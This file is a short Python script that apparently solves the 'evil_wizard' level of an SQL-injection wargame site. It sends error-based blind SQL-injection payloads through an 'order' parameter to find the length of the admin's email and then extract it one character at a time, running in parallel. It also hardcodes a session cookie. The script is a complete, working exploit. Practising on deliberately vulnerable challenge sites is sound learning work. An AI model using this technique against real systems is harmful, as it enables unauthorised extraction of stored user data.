from multiprocessing import Pool
import requests
import string

url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
params={'order' : None}
cookies = {'PHPSESSID' :'1t87momi7f10m7tl6kkv6t0lob' }

# 이메일 길이
for i in range(28,40):
    payload="(select 1 where if(id='admin' and length(email)={},pow(12341234,12341234),1))".format(i)
    params['order'] = payload
    print(payload)
    response = requests.get(url,params=params,cookies=cookies)
    if("rubiya805@gmail.com" not in response.text):
        print("find the pw_length",i)
        break

# 이메일 길이 28

def blind_sql_inject(i):
    for j in string.printable:
        payload="(select 1 where if(id='admin' and ascii(substr(email,{},1))={},pow(12341234,12341234),1))".format(i,ord(j))
        params['order'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("rubiya805@gmail.com" not in response.text):
            print("find idx : {}, character : {}".format(i,j))
            return j

if __name__=='__main__':
    with Pool(5) as p:
        ret = p.map(blind_sql_inject,[i for i in range(1,31)])
    for i in ret:
        print(i,end='')
         